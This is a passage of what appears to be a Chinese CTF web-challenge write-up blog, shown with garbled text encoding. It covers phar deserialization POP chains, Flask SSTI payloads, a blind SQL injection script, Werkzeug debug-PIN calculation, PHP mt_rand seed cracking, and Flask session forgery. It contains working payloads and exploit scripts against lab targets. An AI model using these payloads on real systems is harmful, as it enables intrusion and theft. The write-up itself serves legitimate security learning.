$passwordResult);\r$result-\u0026gt;fetch();\r$result-\u0026gt;close();\rif ($this-\u0026gt;token=='admin') {\rreturn $idResult;\r}\rif (!$idResult) {\recho('ç”¨æˆ·ä¸å­˜åœ¨!');\rreturn false;\r}\rif (md5($this-\u0026gt;password)!==$passwordResult) {\recho('å¯†ç é”™è¯¯ï¼');\rreturn false;\r}\r$_SESSION['token']=$this-\u0026gt;name;\rreturn $idResult;\r}\rpublic function __destruct(){\recho $this-\u0026gt;token;\r}\r}\rClass Upload{\rpublic $flag;\rpublic $file;\rpublic $ext;\rfunction __construct(){\r$this-\u0026gt;flag = 1;\r$this-\u0026gt;black_list = ['ph', 'ht', 'sh', 'pe', 'j', '=', 'co', '\\\\', '\u0026quot;', '\\''];\r}\rfunction check(){\r$ext = substr($_FILES['file']['name'], strpos($_FILES['file']['name'], '.'));\r$reg=implode(\u0026quot;|\u0026quot;,$this-\u0026gt;black_list);\r$reg = \u0026quot;/\u0026quot; . $reg . \u0026quot;\\x|\\s|[\\x01-\\x20]/i\u0026quot;;\rif(preg_match($reg, $ext)){\r$this-\u0026gt;flag = 0;\r}\r$this-\u0026gt;ext = $ext;\r}\rfunction __wakeup(){\r$this-\u0026gt;flag = 1;\r}\rfunction upload(){\r$this-\u0026gt;file = $_FILES['file'];\r$this-\u0026gt;check();\rif($this-\u0026gt;flag){\rif(isset($_FILES['file'])){\rif ($_FILES[\u0026quot;file\u0026quot;][\u0026quot;error\u0026quot;] \u0026gt; 0){\recho \u0026quot;Error: \u0026quot; . $_FILES[\u0026quot;file\u0026quot;][\u0026quot;error\u0026quot;];\r}\relse{\rif (file_exists(\u0026quot;upload/\u0026quot; . $_FILES[\u0026quot;file\u0026quot;][\u0026quot;name\u0026quot;])){\recho $_FILES[\u0026quot;file\u0026quot;][\u0026quot;name\u0026quot;] . \u0026quot; already exists. \u0026quot;;\r}\relse{\rif ($_FILES[\u0026quot;file\u0026quot;][\u0026quot;size\u0026quot;] \u0026gt; 10240){\recho \u0026quot;too big\u0026quot;;\r}\relse{\r$new_addr = $_SERVER['DOCUMENT_ROOT'] . \u0026quot;/upload/\u0026quot; . md5($_FILES['file']['name']) . $this-\u0026gt;ext;\recho $new_addr;\rmove_uploaded_file($_FILES[\u0026quot;file\u0026quot;][\u0026quot;tmp_name\u0026quot;], $new_addr);\rreturn $new_addr;\r}\r}\r}\r}\r}\relse{\rdie(\u0026quot;Noooooooooooooooooooooooooooo!\u0026quot;);\r}\r}\r}\rClass Reader{\rpublic $filename;\rpublic $result;\rpublic function read($filename){\rif (preg_match(\u0026quot;/flag/i\u0026quot;,$filename)){\rdie(\u0026quot;æƒ³å¤šäº†å—·\u0026quot;);\r}\rif (preg_match(\u0026quot;/sh/i\u0026quot;,$filename)){\rdie(\u0026quot;nooooooooooo!\u0026quot;);\r}\rif (preg_match(\u0026quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i\u0026quot;,$filename)){\rdie(\u0026quot;Invid Schema!\u0026quot;);\r}\recho file_get_contents($filename);\r}\rpublic function __set($name,$val){\recho file_get_contents($val);\r}\r}\rä¼—æ‰€å‘¨çŸ¥ï¼Œè¦è§¦å‘pharååºåˆ—åŒ–ï¼Œå¿…é¡»æœ‰æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¸¸è§çš„å¤§æ¦‚æ˜¯ä»¥ä¸‹è¿™äº›ï¼š\nåœ¨class.phpé‡Œé¢ï¼Œèƒ½è§¦å‘çš„åœ°æ–¹æœ‰ä¸¤å¤„ï¼š\n ç¬¬117è¡Œfile_exists ç¬¬153å’Œ156è¡Œçš„file_get_contents  æˆ‘ä»¬èµ·å…ˆçœ‹åˆ°çš„æ˜¯ç¬¬117è¡Œçš„file_existsï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œå°è¯•äº†ä¸€ç•ªä¹‹åå‘ç°è¿™é‡Œå¹¶ä¸èƒ½è§¦å‘pharååºåˆ—åŒ–ã€‚\nåŸå› æ˜¯file_exists(\u0026quot;upload/\u0026quot; . $_FILES[\u0026quot;file\u0026quot;][\u0026quot;name\u0026quot;])è¿›è¡Œäº†æ‹¼æ¥ï¼Œphar://æ˜¯ä¼ ä¸è¿›å»çš„ï¼Œé‚£ä¹ˆå‰©ä¸‹çš„å”¯ä¸€èƒ½è§¦å‘çš„åœ°æ–¹åªæœ‰ç¬¬153å’Œ156è¡Œçš„file_get_contentsäº†ã€‚\nè€Œå®é™…ä¸Šèƒ½è§¦å‘çš„åªæœ‰153è¡Œçš„file_get_contentsï¼Œ156è¡Œçš„æ˜¯ç»™ä½ è¯»flagçš„ã€‚\næ„é€ popé“¾ å…¨å±€æœç´¢é­”æœ¯æ–¹æ³•ï¼›\n155è¡ŒReader::__set\npublic function __set($name,$val){\recho file_get_contents($val);\r}\r31è¡ŒUser::__toString\npublic function __toString()\r{\r$this-\u0026gt;nickname-\u0026gt;backup=$this-\u0026gt;backup;\r$user = new User();\r$user-\u0026gt;id = $_SESSION['id'];\r$user-\u0026gt;nickname = $_SESSION['token'];\rreturn serialize($user);\r}\r81è¡ŒdbCtrl::__destruct\npublic function __destruct(){\recho $this-\u0026gt;token;\r}\rpopé“¾å¾ˆæ˜ç¡®ï¼š\n//popé“¾\r$pop = new dbCtrl();\r$pop-\u0026gt;token = new User();\r$pop-\u0026gt;token-\u0026gt;nickname = new Reader();\r$pop-\u0026gt;token-\u0026gt;backup = '/flag';\r//æ„é€ pharæ–‡ä»¶\r@unlink(\u0026quot;phar.phar\u0026quot;);\r$phar = new Phar(\u0026quot;phar.phar\u0026quot;);\r$phar-\u0026gt;startBuffering();\r$phar-\u0026gt;setStub(\u0026quot;GIF89a\u0026quot;.\u0026quot;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026quot;);\r$phar-\u0026gt;setMetadata($pop);\r$phar-\u0026gt;addFromString(\u0026quot;test.jpg\u0026quot;, \u0026quot;test\u0026quot;);\r$phar-\u0026gt;stopBuffering();\rè¿è¡Œå¾—åˆ°ä¸€ä¸ªphar.pharï¼Œæ”¹åç¼€ï¼ˆphè¢«wafäº†ï¼‰ï¼Œä¸Šä¼ ã€‚\nåœ¨read.phpé‡Œé¢ä¼ å…¥compress.zlib://phar:///var/www/html/upload/xxxè·å¾—flag\nbabyflask è€ƒç‚¹ï¼šå¸¸è§„SSTIå’Œæ²™ç›’é€ƒé€¸\né¢˜ç›®æŒºå‹å¥½çš„ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œéšä¾¿æ‰¾ä¸ªpayloadå°±å¯ä»¥æ‰“å‡ºæ¥ï¼›\n?name={{().__class__.__bases__.__getitem__(0).__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}\rbabyback è€ƒç‚¹ï¼šsqliå•å¼•å·é€ƒé€¸ã€boolç›²æ³¨ã€\nè¿›å»ä¸€ä¸ªç™»å½•æ¡†ï¼›\nfuzzä¸€æ³¢ä¹‹åå‘ç°banæ‰äº†å•åŒå¼•å·ï¼Œè‡ªç„¶æƒ³åˆ°äº†\\é€ æˆçš„å•å¼•å·é€ƒé€¸ã€‚\nsqliç›²æ³¨ username=\\\u0026amp;password=||1#\r//æç¤ºå¯†ç é”™è¯¯ï¼Œæ­£å¸¸çš„åº”è¯¥æ˜¯ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯\rç„¶åè¿˜å‘ç°banäº†selectï¼Œæˆ‘æ‹¼å‘½åœ°æƒ³å»ç»•ï¼Œå¡äº†å¾ˆä¹…ï¼Œç»“æœæ ¹æœ¬ä¸ç”¨æ³¨è¡¨ååˆ—åï¼Œåªéœ€è¦å¾—åˆ°ç®¡ç†å‘˜å¯†ç å°±è¡Œäº†ï¼ˆåœ¨robots.txtä¹Ÿæœ‰æç¤ºï¼‰\nusername=\\\u0026amp;password=||ascii(substr(password,1,1))\u0026gt;1#\rè¿™é‡Œæ˜¯ç›²æ³¨çš„expï¼š\n#python3\r#wh1sper\rimport requests\rhost = 'http://eci-2zebr3la2yjigbu8w27y.cloudeci1.ichunqiu.com/index.php'\rdef mid(bot, top):\rreturn (int)(0.5 * (top + bot))\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\r#babyselect = 'database()'#--p3rh4ps\rbabyselect = 'password'#--uAreRigHt\rdata = {\r\u0026quot;username\u0026quot;: \u0026quot;\\\\\u0026quot;,\r\u0026quot;password\u0026quot;: \u0026quot;||ascii(substr({},{},1))\u0026gt;{}#\u0026quot;.format(babyselect, j, mid(bot, top))\r}\rr = requests.post(url=host, data=data)\r#print(r.text)\r#print(data)\rif '\u0026gt;å¯†ç é”™è¯¯\u0026lt;' in r.text:\rif top - 1 == bot:\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top)\relse:\rif top - 1 == bot:\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top)\rif __name__ == '__main__':\rsqli()\rç™»å½•ï¼Œæ¥åˆ°ç¬¬äºŒå…³ï¼›\næ˜¯ä¸€ä¸ªevalå‡½æ•°ï¼Œ\neval($command.\u0026quot;=false\u0026quot;);\rwafå¾ˆå¼ºï¼Œå¯ä»¥ç”¨å–åç›´æ¥includeæ ¹ç›®å½•çš„flagï¼š\ncommand=?\u0026gt;\u0026lt;?=include~%D0%99%93%9E%98?\u0026gt;\r","date":"2020-09-27T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228104117.jpeg","permalink":"https://anthem-whisper.github.io/p/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/","title":"2020â€œå·…å³°æå®¢â€"},{"content":"[FBCTF2019]RCEService è€ƒç‚¹ï¼š%0aç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œç»å¯¹è·¯å¾„è°ƒç”¨ç³»ç»Ÿå‘½ä»¤\nè¦æ±‚ç”¨jsonä¼ å…¥cmdå‚æ•°RCEï¼Œä½†æ˜¯åªç»™äº†lså‘½ä»¤å…¶ä»–çš„éƒ½ä¸ç»™\næ¯”èµ›çš„æ—¶å€™åº”è¯¥æ˜¯ç»™äº†æºç ï¼š\n\u0026lt;?php\rputenv('PATH=/home/rceservice/jail');\rif (isset($_REQUEST['cmd'])) {\r$json = $_REQUEST['cmd'];\rif (!is_string($json)) {\recho 'Hacking attempt detected\u0026amp;lt;br/\u0026amp;gt;\u0026amp;lt;br/\u0026amp;gt;';\r} elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) {\recho 'Hacking attempt detected\u0026amp;lt;br/\u0026amp;gt;\u0026amp;lt;br/\u0026amp;gt;';\r} else {\recho 'Attempting to run command:\u0026amp;lt;br/\u0026amp;gt;';\r$cmd = json_decode($json, true)['cmd'];\rif ($cmd !== NULL) {\rsystem($cmd);\r} else {\recho 'Invalid input';\r}\recho '\u0026amp;lt;br/\u0026amp;gt;\u0026amp;lt;br/\u0026amp;gt;';\r}\r}\r?\u0026gt;\ræ­£åˆ™åŒ¹é…çš„æ—¶å€™æ²¡æœ‰ç”¨mä¿®é¥°ç¬¦(æ¢è¡ŒåŒ¹é…)ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨%0aæ¥ç»•è¿‡\nç„¶åä»–è®¾ç½®äº†PATH=/home/rceservice/jailï¼Œè¿™ä¸ªç›®å½•ä¸‹åªæœ‰lsä¸€ä¸ªå‘½ä»¤ï¼Œæƒ³è¦è°ƒç”¨å…¶ä»–ç³»ç»Ÿå‘½ä»¤æˆ‘ä»¬è¿˜è¦ä¼ å…¥ç»å¯¹è·¯å¾„ï¼Œæ¯”å¦‚/bin/catã€‚\nflagåœ¨PATHçš„ä¸Šçº§ç›®å½•ã€‚\n?cmd={%0A\u0026quot;cmd\u0026quot;:\u0026quot;/bin/cat /home/rceservice/flag\u0026quot;%0A}\r[GYCTF2020]FlaskApp è€ƒç‚¹ï¼šflaskSSTIã€pinç \nrefererï¼šhttps://blog.csdn.net/Alexhcf/article/details/108400293\nä»base64è§£ç å‘ç°SSTI é¢˜ç›®æœ€å¼€å§‹ç»™äº†ä¸¤ä¸ªé¡µé¢ï¼Œä¸€ä¸ªæ˜¯base64åŠ å¯†ã€ä¸€ä¸ªæ˜¯base64è§£å¯†\nåœ¨base64è§£å¯†çš„é¡µé¢å¦‚æœè§£å¯†å‡ºç°é”™è¯¯çš„è¯ï¼Œä¼šå¼€å¯debug\nè€Œä¸”åœ¨base64è§£å¯†çš„é¡µé¢å‘ç°äº†æ¨¡æ¿æ³¨å…¥ï¼Œä¼ å…¥{{config}}çš„base64ç¼–ç ä¼šçœ‹åˆ°ä»¥ä¸‹ç•Œé¢ï¼š\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ²™ç®±é€ƒé€¸è¯•è¯•ï¼Œå¯ä»¥ç”¨jinja2ä¸­æ§åˆ¶ç»“æ„ {% %} ï¼Œä¹Ÿå¯ä»¥ç”¨å˜é‡å–å€¼ {{}}\nå¦‚æœç”¨æ§åˆ¶ç»“æ„ï¼š\n{% for c in [].__class__.__base__.__subclasses__() %} {% if 'catch_warnings' in c.__name__%} {{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }} {% endif %}{% endfor %}\ræ”¹æˆä¸€è¡Œï¼š\n{% for c in [].__class__.__base__.__subclasses__() %}{% if 'catch_warnings' in c.__name__%}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}\rå¯ä»¥è¯»å–app.pyçš„æºç ï¼Œå½“ç„¶ä¹Ÿå¯è¯»å–æ ¹ç›®å½•çš„flag\nå¦‚æœç”¨å˜é‡å–å€¼ï¼š\n{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}\rå¯ä»¥åˆ—æ ¹ç›®å½•æ–‡ä»¶ï¼ˆè¿™ä¸ªè§£æ³•æ˜¯éé¢„æœŸï¼Œé¢„æœŸæ˜¯pinï¼‰\nä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯{{''.__class__.__bases__[0].__subclasses__()}}å¹¶ä¸ä¼šæœ‰ä»»ä½•å›æ˜¾ï¼Œéœ€è¦subclasses__()[xx]æ…¢æ…¢æ‰¾\né¢„æœŸè§£æ˜¯ç®—pinç ç„¶åç”¨debugæ¥RCEï¼›\nè¯»å–6ä¸ªå‚æ•°è®¡ç®—pinç  ä»»æ„æ–‡ä»¶è¯»å–çš„payloadæ˜¯ï¼š\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}\rå…¶ä¸­filenameæ˜¯æ–‡ä»¶åç§°\né€šè¿‡PINç ç”Ÿæˆæœºåˆ¶å¯çŸ¥ï¼Œéœ€è¦è·å–å¦‚ä¸‹ä¿¡æ¯\n æœåŠ¡å™¨è¿è¡Œflaskæ‰€ç™»å½•çš„ç”¨æˆ·åã€‚é€šè¿‡/etc/passwdä¸­å¯ä»¥çŒœæµ‹ä¸ºflaskweb æˆ–è€…rootï¼Œæ­¤å¤„ç”¨çš„flaskweb modnameã€‚ä¸€èˆ¬ä¸å˜å°±æ˜¯flask.app getattr(app, â€œ__name__â€, app.__class__.__name__)ã€‚pythonè¯¥å€¼ä¸€èˆ¬ä¸ºFlaskï¼Œè¯¥å€¼ä¸€èˆ¬ä¸å˜ flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„ã€‚æŠ¥é”™ä¿¡æ¯ä¼šæ³„éœ²è¯¥å€¼ã€‚é¢˜ä¸­ä¸º/usr/local/lib/python3.7/site-packages/flask/app.py å½“å‰ç½‘ç»œçš„macåœ°å€ï¼ˆåå…­è¿›åˆ¶ï¼‰çš„åè¿›åˆ¶æ•°ã€‚é€šè¿‡æ–‡ä»¶/sys/class/net/eth0/address è·å–(eth0ä¸ºç½‘å¡å)ï¼Œæˆ‘å¼€çš„BUUçš„dockerä¸º02:42:ae:01:2d:af ï¼Œè½¬æ¢åä¸º2485410376060 æœºå™¨çš„idï¼šå¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„id Linuxï¼š/etc/machine-idæˆ–/proc/sys/kernel/random/boot_iï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ Windows dockerï¼š/proc/self/cgroup  è·å–äº†6ä¸ªå€¼ä¹‹åï¼Œå¯ä»¥åˆ©ç”¨expè®¡ç®—pinç \nimport hashlib\rfrom itertools import chain\rprobably_public_bits = [\r'flaskweb', # æœåŠ¡å™¨è¿è¡Œflaskæ‰€ç™»å½•çš„ç”¨æˆ·å\r'flask.app', # modname\r'Flask', # getattr(app, \u0026quot;\\_\\_name__\u0026quot;, app.\\_\\_class__.\\_\\_name__)\r'/usr/local/lib/python3.7/site-packages/flask/app.py', # flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„\r]\rprivate_bits = [\r'2485410409903', # å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°\r'0a1d70fa2590282a8abb5e96d8f175b147dd2477459d97c179af421feb9260cd' # æœºå™¨çš„id\r]\rh = hashlib.md5()\rfor bit in chain(probably_public_bits, private_bits):\rif not bit:\rcontinue\rif isinstance(bit, str):\rbit = bit.encode('utf-8')\rh.update(bit)\rh.update(b'cookiesalt')\rcookie_name = '__wzd' + h.hexdigest()[:20]\rnum = None\rif num is None:\rh.update(b'pinsalt')\rnum = ('%09d' % int(h.hexdigest(), 16))[:9]\rrv = None\rif rv is None:\rfor group_size in 5, 4, 3:\rif len(num) % group_size == 0:\rrv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\rfor x in range(0, len(num), group_size))\rbreak\relse:\rrv = num\rprint(rv)\rè¿è¡Œå¾—åˆ°131-679-327ï¼Œåœ¨debugè¾“å…¥ç„¶åRCE\n[MRCTF2020]Ezaudit è€ƒç‚¹ï¼šPHPä¼ªéšæœºæ•°ï¼Œsqlæ³¨å…¥\nè¦å…ˆæ‰«ç›®å½•ï¼Œå¯ä»¥æ‰«åˆ°login.phpå’Œwww.zipï¼Œæºç ï¼š\n\u0026lt;?php\rheader('Content-type:text/html; charset=utf-8');\rerror_reporting(0);\rif(isset($_POST['login'])){\r$username = $_POST['username'];\r$password = $_POST['password'];\r$Private_key = $_POST['Private_key'];\rif (($username == '') || ($password == '') ||($Private_key == '')) {\r// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢\rheader('refresh:2; url=login.html');\recho \u0026quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!\u0026quot;;\rexit;\r}\relse if($Private_key != '*************' )\r{\rheader('refresh:2; url=login.html');\recho \u0026quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!\u0026quot;;\rexit;\r}\relse{\rif($Private_key === '************'){\r$getuser = \u0026quot;SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\u0026quot;.';';\r$link=mysql_connect(\u0026quot;localhost\u0026quot;,\u0026quot;root\u0026quot;,\u0026quot;root\u0026quot;);\rmysql_select_db(\u0026quot;test\u0026quot;,$link);\r$result = mysql_query($getuser);\rwhile($row=mysql_fetch_assoc($result)){\recho \u0026quot;\u0026amp;lt;tr\u0026amp;gt;\u0026amp;lt;td\u0026amp;gt;\u0026quot;.$row[\u0026quot;username\u0026quot;].\u0026quot;\u0026amp;lt;/td\u0026amp;gt;\u0026amp;lt;td\u0026amp;gt;\u0026quot;.$row[\u0026quot;flag\u0026quot;].\u0026quot;\u0026amp;lt;/td\u0026amp;gt;\u0026amp;lt;td\u0026amp;gt;\u0026quot;;\r}\r}\r}\r}\r// genarate public_key\rfunction public_key($length = 16) {\r$strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\r$public_key = '';\rfor ( $i = 0; $i \u0026amp;lt; $length; $i++ )\r$public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);\rreturn $public_key;\r}\r//genarate private_key\rfunction private_key($length = 12) {\r$strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\r$private_key = '';\rfor ( $i = 0; $i \u0026amp;lt; $length; $i++ )\r$private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\rreturn $private_key;\r}\r$Public_key = public_key();\r//$Public_key = KVQP0LdJKRaV3n9D how to get crispr's private_key???\rå…¶å®å°±æ˜¯ä¸¤é“é¢˜ç„Šæ¥èµ·æ¥ï¼Œç”¨GWCTFçš„expå¯ä»¥ç›´æ¥æ‰“ï¼š\n#!/usr/bin/env python\rstr1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\rstr2='KVQP0LdJKRaV3n9D'\rstr3 = str1[::-1]\rlength = len(str2)\rres=''\rfor i in range(len(str2)):\rfor j in range(len(str1)):\rif str2[i] == str1[j]:\rres+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '\rbreak\rprint res\rå¾—åˆ°ï¼š\n36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61\ræ‹¿å»php_mt_seedè·‘ï¼Œå¾—åˆ°ç§å­1775196155ï¼Œç„¶åå»ç®—ç§é’¥ï¼Œæ³¨æ„è¦å…ˆæŠŠå…¬é’¥ç®—ä¸€éå†ç®—ç§é’¥ï¼›\nç®—å‡ºæ¥ä¹‹åsqliç›´æ¥ä¸‡èƒ½å¯†ç ç™»å½•ï¼›\nflag{a0b16377-22ae-4b81-b054-2afb7a5e6e6b\n[SWPU2019]Web3 è€ƒç‚¹ï¼šflask sessionä¼ªé€ ã€å‘½ä»¤æ³¨å…¥ã€CVE-2018-12015ã€/proc/self/cwdã€/proc/self/environ\n\u0026gt;\u0026gt;[Linuxä¸‹/proc/pid]/*çš„ä½œç”¨\nè¾“å…¥ç”¨æˆ·åç™»å½•ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºâ€œHello wh1sperâ€ï¼Œå°è¯•{{}}æ²¡æœ‰æ¢æµ‹åˆ°æ³¨å…¥ã€‚\nç™»é™†ä¹‹åæœ‰ä¸ª/uploadè·¯ç”±ï¼Œä½†æ˜¯æç¤ºæ²¡æœ‰æƒé™ï¼Œä¼°è®¡æ˜¯è¦è¿›è¡Œcookieä¼ªé€ \nè½¬è€ŒæŠŠæ³¨æ„åŠ›æ”¾åœ¨äº†cookieä¸Šé¢ã€‚\nsessionä¼ªé€  åˆ©ç”¨flask-session-cookie-manager-masterè¿›è¡Œè§£ç ï¼š\npython .\\flask_session_cookie_manager3.py decode -c \u0026quot;.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVCrPMCwuSC1S0lEqLU4tykvMTUUSrAUA2H4Z2g.X3vTHQ.Se1sFiI38_RUBhZeYgBMY2hoNaQ\u0026quot;\rb'{\u0026quot;id\u0026quot;:{\u0026quot; b\u0026quot;:\u0026quot;MTAw\u0026quot;},\u0026quot;is_login\u0026quot;:true,\u0026quot;password\u0026quot;:\u0026quot;wh1sper\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;wh1sper\u0026quot;}'\rå¦‚æœè®¿é—®ä¸å­˜åœ¨çš„è·¯ç”±ä¼šç»™ä¸€ä¸ªå“åº”å¤´ï¼š\nSwpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg== base64è§£ç ä¹‹åå°±æ˜¯secret_key(è¿™é‡Œæ²¡ææ‡‚ä¸ºä»€ä¹ˆè¦è¿™æ ·å‡º):\nSECRET_KEY:keyqqqwwweee!@#$%^\u0026amp;* å†æ¬¡è¿›è¡Œè§£ç ï¼š\npython .\\flask_session_cookie_manager3.py decode -c \u0026quot;.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVCrPMCwuSC1S0lEqLU4tykvMTUUSrAUA2H4Z2g.X3vTHQ.Se1sFiI38_RUBhZeYgBMY2hoNaQ\u0026quot; -s \u0026quot;keyqqqwwweee!@#$%^\u0026amp;*\u0026quot;\r{'id': b'100', 'is_login': True, 'password': 'wh1sper', 'username': 'wh1sper'}\rç›²çŒœå¦‚æœid=1çš„è¯åº”è¯¥å°±å¯ä»¥è¶Šæƒï¼Œé‚£ä¹ˆå†æ¬¡åŠ å¯†å›å»ï¼›\npython .\\flask_session_cookie_manager3.py encode -s \u0026quot;keyqqqwwweee!@#$%^\u0026amp;*\u0026quot; -t \u0026quot;{'id': '1', 'is_login': True, 'password': 'wh1sper', 'username': 'wh1sper'}\u0026quot;\r.eJyrVspMUbJSMlTSUcosjs_JT8_MU7IqKSpN1VEqSCwuLs8vAkmXZxgWF6QWARWVFqcW5SXmpiIJ1gIA95wWug.X3vb0w.5S11T85EsOVa2ggJa_vbtgJDxr4\rF12æ›¿æ¢cookieï¼Œæ¥åˆ°/uploadè·¯ç”±ï¼›\nctrl+Uèƒ½å¤ŸæŸ¥çœ‹åˆ°åç«¯æºç ï¼š\n@app.route('/upload', methods=['GET', 'POST'])\rdef upload():\rif session['id'] != b'1':\rreturn render_template_string(temp)\rif request.method == 'POST':\rm = hashlib.md5()\rname = session['password']\rname = name + 'qweqweqwe'\rname = name.encode(encoding='utf-8')\rm.update(name)\rmd5_one = m.hexdigest()\rn = hashlib.md5()\rip = request.remote_addr\rip = ip.encode(encoding='utf-8')\rn.update(ip)\rmd5_ip = n.hexdigest()\rf = request.files['file']\rbasepath = os.path.dirname(os.path.realpath(__file__))\rpath = basepath + '/upload/' + md5_ip + '/' + md5_one + '/' + session['username'] + \u0026quot;/\u0026quot;\rpath_base = basepath + '/upload/' + md5_ip + '/'\rfilename = f.filename\rpathname = path + filename\rif \u0026quot;zip\u0026quot; != filename.split('.')[-1]:\rreturn 'zip only allowed'\rif not os.path.exists(path_base):\rtry:\ros.makedirs(path_base)\rexcept Exception as e:\rreturn 'error'\rif not os.path.exists(path):\rtry:\ros.makedirs(path)\rexcept Exception as e:\rreturn 'error'\rif not os.path.exists(pathname):\rtry:\rf.save(pathname)\rexcept Exception as e:\rreturn 'error'\rtry:\rcmd = \u0026quot;unzip -n -d \u0026quot; + path + \u0026quot; \u0026quot; + pathname\rif cmd.find('|') != -1 or cmd.find(';') != -1:\rwaf()\rreturn 'error'\ros.system(cmd)\rexcept Exception as e:\rreturn 'error'\runzip_file = zipfile.ZipFile(pathname, 'r')\runzip_filename = unzip_file.namelist()[0]\rif session['is_login'] != True:\rreturn 'not login'\rtry:\rif unzip_filename.find('/') != -1:\rshutil.rmtree(path_base)\ros.mkdir(path_base)\rreturn 'error'\rimage = open(path + unzip_filename, \u0026quot;rb\u0026quot;).read()\rresp = make_response(image)\rresp.headers['Content-Type'] = 'image/png'\rreturn resp\rexcept Exception as e:\rshutil.rmtree(path_base)\ros.mkdir(path_base)\rreturn 'error'\rreturn render_template('upload.html')\r@app.route('/showflag')\rdef showflag():\rif True == False:\rimage = open(os.path.join('./flag/flag.jpg'), \u0026quot;rb\u0026quot;).read()\rresp = make_response(image)\rresp.headers['Content-Type'] = 'image/png'\rreturn resp\relse:\rreturn \u0026quot;can't give you\u0026quot;\råˆ©ç”¨è½¯è¿æ¥è·å–flagï¼šCVE-2018-12015 Perlæ˜¯ç¾å›½ç¨‹åºå‘˜æ‹‰é‡Œ-æ²ƒå°”ï¼ˆLarry Wallï¼‰æ‰€ç ”å‘çš„ä¸€ç§å…è´¹ä¸”åŠŸèƒ½å¼ºå¤§çš„è·¨å¹³å°ç¼–ç¨‹è¯­è¨€ã€‚Archiveï¼šï¼šTar moduleæ˜¯å…¶ä¸­çš„ä¸€ä¸ªç”¨äºå¤„ç†taræ–‡ä»¶çš„æ¨¡å—ã€‚ Perl 5.26.2åŠä¹‹å‰ç‰ˆæœ¬ä¸­çš„Archiveï¼šï¼šTaræ¨¡å—å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯å€ŸåŠ©å¸¦æœ‰ç›¸åŒåç§°çš„ç¬¦å·é“¾æ¥å’Œå¸¸è§„æ–‡ä»¶çš„å½’æ¡£æ–‡ä»¶åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡ç›®å½•éå†ä¿æŠ¤æœºåˆ¶å¹¶è¦†ç›–ä»»æ„æ–‡ä»¶ã€‚\nä»¥æ­£å¸¸é€»è¾‘æ¥çœ‹ï¼Œæºç 